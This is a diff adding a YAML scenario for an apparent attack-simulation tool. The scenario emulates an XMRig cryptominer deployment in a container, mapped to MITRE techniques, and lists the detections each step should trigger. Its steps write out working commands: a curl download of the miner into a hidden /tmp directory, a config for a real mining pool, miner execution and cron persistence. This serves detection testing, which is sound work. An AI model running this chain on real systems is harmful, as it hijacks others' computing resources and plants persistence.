@@ -1,0 +1,146 @@
+scenario_id: SIM-CDR-002
+name: "Cryptominer Deployment — Unit 42 XMRig Variant"
+version: "1.0"
+status: active
+
+plane: CDR
+detection_types:
+  - BIOC
+  - Analytics
+
+uc_ref: UCS-CDR-02
+tc_ref: TC-CDR-02
+uc_name: "Cryptomining Activity Detection"
+tc_name: "XMRig Deployment and Execution"
+
+mitre_tactic: "TA0040"
+mitre_tactic_name: "Impact"
+mitre_technique: "T1496"
+mitre_technique_name: "Resource Hijacking"
+additional_techniques:
+  - technique: "T1105"
+    name: "Ingress Tool Transfer"
+
+threat_report: "Unit42 - Large-Scale Monero Cryptomining Operation Using XMRig"
+threat_report_url: "https://unit42.paloaltonetworks.com/unit42-large-scale-monero-cryptocurrency-mining-operation-using-xmrig/"
+
+execution_identity:
+  default: container-runtime
+  options:
+    - container-runtime
+    - nobody
+
+push_supported: true
+pull_supported: true
+
+external_tools:
+  - name: xmrig
+    source: "https://github.com/xmrig/xmrig"
+    type: binary
+    install_inline: true
+
+steps:
+  - id: step-01
+    name: "Disable security limits and prepare mining environment"
+    command: |
+      ulimit -n 65535 2>/dev/null; \
+      ulimit -u unlimited 2>/dev/null; \
+      echo never > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true; \
+      sysctl -w vm.nr_hugepages=128 2>/dev/null || true; \
+      mkdir -p /tmp/.xmr && echo '[*] Mining env prepared'
+    identity: container-runtime
+    mitre_technique: "T1562.001"
+    expected_detections:
+      - plane: CDR
+        type: Analytics
+        description: "System limit modification in container — ulimit/sysctl tuning consistent with cryptominer pre-deployment"
+
+  - id: step-02
+    name: "Download XMRig binary (Unit 42 observed delivery mechanism)"
+    command: |
+      ARCH=$(uname -m); \
+      if [ "$ARCH" = "x86_64" ]; then XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"; \
+      else XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-armv8.tar.gz"; fi; \
+      curl -sSL "$XMRIG_URL" -o /tmp/.xmr/xmrig.tar.gz && \
+      tar -xzf /tmp/.xmr/xmrig.tar.gz -C /tmp/.xmr/ --strip-components=1 && \
+      chmod +x /tmp/.xmr/xmrig && \
+      echo '[*] XMRig downloaded successfully'
+    identity: container-runtime
+    mitre_technique: "T1105"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "XMRig binary download and extraction — cryptominer tool transfer signature"
+      - plane: CDR
+        type: Analytics
+        description: "Compressed binary downloaded and extracted to /tmp hidden directory in container"
+
+  - id: step-03
+    name: "Configure XMRig mining pool connection"
+    command: |
+      cat > /tmp/.xmr/config.json << 'XMRCFG'
+      {
+        "autosave": true,
+        "cpu": {"enabled": true, "max-threads-hint": 75},
+        "pools": [{
+          "url": "pool.minexmr.com:4444",
+          "user": "SIMULATION_WALLET_DO_NOT_USE",
+          "pass": "cortexsim-test",
+          "keepalive": true
+        }]
+      }
+      XMRCFG
+      echo '[*] Mining pool config written'
+    identity: container-runtime
+    mitre_technique: "T1496"
+    expected_detections:
+      - plane: CDR
+        type: Analytics
+        description: "Known cryptomining pool domain/IP in config file — pool.minexmr.com association"
+
+  - id: step-04
+    name: "Execute XMRig miner (limited to 30 seconds for simulation)"
+    command: "timeout 30 /tmp/.xmr/xmrig --config /tmp/.xmr/config.json --no-color 2>&1 | head -50 | tee /tmp/.xmr/miner.log; echo '[CortexSim] XMRig execution window complete'"
+    identity: nobody
+    mitre_technique: "T1496"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Cryptominer binary execution — XMRig process tree detected by CDR runtime BIOC"
+      - plane: CDR
+        type: Analytics
+        description: "Sustained CPU spike from container process consistent with cryptomining workload"
+
+  - id: step-05
+    name: "Attempt persistence via cron (Unit 42 observed TTPs)"
+    command: |
+      (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json >/dev/null 2>&1") | crontab - 2>/dev/null; \
+      echo "*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json" >> /var/spool/cron/nobody 2>/dev/null || true; \
+      echo '[*] Persistence attempt complete'
+    identity: container-runtime
+    mitre_technique: "T1053.005"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Crontab modification to persist cryptominer — scheduled task creation from container"
+      - plane: CDR
+        type: Analytics
+        description: "Cryptominer binary added to cron schedule — multi-stage malware persistence behavior"
+
+cleanup:
+  commands:
+    - "crontab -l 2>/dev/null | grep -v xmrig | crontab - 2>/dev/null || true"
+    - "rm -rf /tmp/.xmr"
+    - "echo '[CortexSim] SIM-CDR-002 cleanup complete'"
+  k8s_teardown: "kubectl delete -f {manifest_path}"
+
+author: "Henry Reed"
+created: "2026-04-12"
+last_updated: "2026-04-12"
+tags:
+  - cryptomining
+  - xmrig
+  - unit42
+  - resource-hijacking
+  - persistence
+  - cloud-native
